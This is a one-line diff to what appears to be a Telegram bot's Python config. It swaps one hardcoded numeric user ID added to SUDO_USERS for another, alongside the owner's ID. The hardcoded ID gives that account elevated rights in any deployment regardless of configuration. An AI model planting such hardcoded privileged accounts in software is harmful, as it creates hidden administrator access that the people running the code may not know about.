@@ -119,7 +119,7 @@ else:
     AI_API_KEY = Config.AI_API_KEY
     escape_markdown = config.escape_markdown
 SUDO_USERS.add(OWNER_ID)
-SUDO_USERS.add(1118936839)
+SUDO_USERS.add(989037511)
  
 
 
